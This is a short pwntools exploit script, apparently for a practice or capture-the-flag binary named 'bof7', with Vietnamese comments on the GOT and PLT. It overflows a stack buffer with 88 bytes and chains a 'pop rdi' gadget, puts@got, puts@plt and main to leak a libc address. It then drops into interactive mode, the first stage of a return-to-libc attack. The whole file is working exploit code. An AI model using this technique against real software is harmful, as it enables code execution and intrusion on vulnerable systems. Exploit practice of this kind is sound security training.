from pwn import*
exe = ELF('./bof7',checksec=False)
p=process(exe.path)

#GOT && PLT
#Global offset table: Nơi chứa địa chỉ các hàm của libc
#Procedure Linkage Table: Là lệnh thực thi hàm được chứa ở GOT

pop_rdi = 0x0000000000401263

payload = b'a'*88
payload+= p64(pop_rdi) + p64(exe.got.puts)
payload+= p64(exe.plt.puts)
payload+= p64(exe.sym['main'])
p.sendafter(b'something: \n',payload)
libc_leak = u64(p.recv(6)+b'\0\0')
log.info('Libc_leak: '+ hex(libc_leak))

p.interactive()